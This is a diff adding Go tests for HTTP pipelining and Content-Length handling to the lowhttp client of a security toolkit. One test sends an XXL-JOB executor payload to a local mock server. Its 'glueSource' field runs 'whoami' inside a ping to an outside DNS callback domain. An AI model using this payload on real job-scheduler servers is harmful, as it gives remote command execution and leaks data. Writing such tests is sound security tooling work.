@@ -2,6 +2,7 @@ package lowhttp
 
 import (
 	"bytes"
+	"fmt"
 	"io"
 	"net"
 	"net/http"
@@ -15,6 +16,92 @@ import (
 
 	_ "github.com/yaklang/yaklang/common/utils/tlsutils"
 )
+
+func TestLowhttp_Pipeline_AutoFix(t *testing.T) {
+	count := 0
+	host, port := utils.DebugMockHTTPHandlerFunc(func(writer http.ResponseWriter, request *http.Request) {
+		count++
+		writer.Write([]byte("ab"))
+	})
+	var packet = `GET / HTTP/1.1
+Host: ` + utils.HostPort(host, port) + `
+Content-Length: 1
+
+aGET / HTTP/1.1
+Host: ` + utils.HostPort(host, port) + `
+Content-Length: 2
+
+aa`
+	rsp, err := HTTP(WithPacketBytes([]byte(packet)), WithTimeout(2*time.Second))
+	if err != nil {
+		t.Fatal(err)
+	}
+	fmt.Println(string(rsp.RawPacket))
+	fmt.Println("------------------------------")
+	fmt.Println(string(rsp.RawRequest))
+	if strings.Count(string(rsp.RawPacket), `HTTP/1.1 200 OK`) != 2 && count == 2 {
+		t.Fatal("BUG: Pipeline failed")
+	}
+
+	packet = `GET / HTTP/1.1
+Host: ` + utils.HostPort(host, port) + `
+Content-Length: 2
+
+aGET / HTTP/1.1
+Host: ` + utils.HostPort(host, port) + `
+Content-Length: 2
+
+aa`
+	rsp, err = HTTP(WithPacketBytes([]byte(packet)), WithTimeout(2*time.Second))
+	if err != nil {
+		t.Fatal(err)
+	}
+	fmt.Println(string(rsp.RawPacket))
+	fmt.Println("------------------------------")
+	fmt.Println(string(rsp.RawRequest))
+	if strings.Count(string(rsp.RawPacket), `HTTP/1.1 200 OK`) != 1 && count == 3 {
+		t.Fatal("BUG: Pipeline failed")
+	}
+}
+
+func TestLowhttp_Pipeline_AutoFix2(t *testing.T) {
+	count := 0
+	host, port := utils.DebugMockHTTPHandlerFunc(func(writer http.ResponseWriter, request *http.Request) {
+		count++
+		writer.Write([]byte("ab"))
+	})
+	var packet = `POST /run HTTP/1.1
+Host: www.example.com
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
+Content-Type: application/json
+Content-Length: 1
+
+{
+  "jobId": 1,
+  "executorHandler": "demoJobHandler",
+  "executorParams": "demoJobHandler",
+  "executorBlockStrategy": "COVER_EARLY",
+  "executorTimeout": 0,
+  "logId": 1,
+  "logDateTime": 1586629003729,
+  "glueType": "GLUE_SHELL",
+  "glueSource": "ping ` + "`" + `whoami` + "`" + `.jscaojctxy.dgrh3.cn",
+  "glueUpdatetime": 1586699003758,
+  "broadcastIndex": 0,
+  "broadcastTotal": 0
+}`
+	rsp, err := HTTP(WithPacketBytes([]byte(packet)), WithTimeout(2*time.Second), WithHost(host), WithPort(port))
+	if err != nil {
+		t.Fatal(err)
+	}
+	fmt.Println(string(rsp.RawPacket))
+	fmt.Println("------------------------------")
+	fmt.Println(string(rsp.RawRequest))
+}
 
 func TestLowhttpResponse2(t *testing.T) {
 	host, port, _ := utils.ParseStringToHostPort("https://pie.dev")
